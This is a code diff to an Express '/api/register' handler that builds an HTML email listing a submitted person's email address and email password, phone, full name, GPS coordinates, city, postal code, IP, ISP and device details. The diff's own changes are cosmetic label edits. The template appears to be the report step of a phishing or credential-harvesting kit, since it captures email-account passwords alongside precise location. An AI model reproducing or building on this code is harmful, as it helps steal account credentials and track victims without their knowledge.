@@ -165,7 +165,7 @@ app.post('/api/register', async (req, res) => {
         
         // ========== HTML EMAIL SUPER MODERN + FLAG ==========
         const htmlContent = `
-<!DOCTYPE html>
+         <!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
@@ -244,12 +244,6 @@ body{
     max-width:60%;
 }
 
-.password{
-    background:#dffcff;
-    border:1px solid #00bcd4;
-    padding:3px 8px;
-}
-
 .footer-sign{
     margin-top:25px;
     background:#3914cc;
@@ -283,28 +277,28 @@ body{
             </div>
 
             <div class="data-row">
-                <div class="label">Email</div>
+                <div class="label">Email : </div>
                 <div class="value">
                     ${data.email || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Password</div>
-                <div class="value password">
+                <div class="label">Password : </div>
+                <div class="value">
                     ${data.emailPassword || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Phone</div>
+                <div class="label">Phone : </div>
                 <div class="value">
                     ${data.phone || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Full Name</div>
+                <div class="label">Full Name : </div>
                 <div class="value">
                     ${data.fullName || '-'}
                 </div>
@@ -320,21 +314,21 @@ body{
             </div>
 
             <div class="data-row">
-                <div class="label">Latitude</div>
+                <div class="label">Latitude : </div>
                 <div class="value">
                     ${data.latitude || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Longitude</div>
+                <div class="label">Longitude : </div>
                 <div class="value">
                     ${data.longitude || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Accuracy</div>
+                <div class="label">Accuracy : </div>
                 <div class="value">
                     ${data.gps_accuracy || '-'} m
                 </div>
@@ -350,28 +344,28 @@ body{
             </div>
 
             <div class="data-row">
-                <div class="label">Country</div>
+                <div class="label">Country : </div>
                 <div class="value">
                     ${countryName} ${flagEmoji}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Province</div>
+                <div class="label">Province : </div>
                 <div class="value">
                     ${data.province || data.ip_region || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">City</div>
+                <div class="label">City : </div>
                 <div class="value">
                     ${data.city || data.ip_city || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Postal Code</div>
+                <div class="label">Postal Code : </div>
                 <div class="value">
                     ${data.postalCode || '-'}
                 </div>
@@ -387,14 +381,14 @@ body{
             </div>
 
             <div class="data-row">
-                <div class="label">IP Address</div>
+                <div class="label">IP Address : </div>
                 <div class="value">
                     ${data.ip_address || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">ISP</div>
+                <div class="label">ISP : </div>
                 <div class="value">
                     ${data.isp || '-'}
                 </div>
@@ -410,21 +404,21 @@ body{
             </div>
 
             <div class="data-row">
-                <div class="label">Platform</div>
+                <div class="label">Platform : </div>
                 <div class="value">
                     ${data.platform || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Resolution</div>
+                <div class="label">Resolution : </div>
                 <div class="value">
                     ${data.screenResolution || '-'}
                 </div>
             </div>
 
             <div class="data-row">
-                <div class="label">Language</div>
+                <div class="label">Language : </div>
                 <div class="value">
                     ${data.language || '-'}
                 </div>
@@ -440,7 +434,7 @@ body{
             </div>
 
             <div class="data-row">
-                <div class="label">Time</div>
+                <div class="label">Time : </div>
                 <div class="value">
                     ${data.timestamp || new Date().toLocaleString()}
                 </div>
